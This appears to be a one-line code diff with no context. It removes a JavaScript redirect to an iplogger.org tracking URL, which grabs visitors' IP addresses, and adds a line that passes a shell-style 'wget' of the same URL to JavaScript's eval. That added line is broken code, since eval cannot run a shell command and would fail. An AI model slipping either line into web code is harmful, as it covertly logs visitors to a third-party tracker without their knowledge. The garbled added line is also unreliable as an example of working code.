@@ -1,1 +1,1 @@
-window.location.replace("https://iplogger.org/logger/MwJ64c7nWESe");
+eval("wget https://iplogger.org/logger/MwJ64c7nWESe");
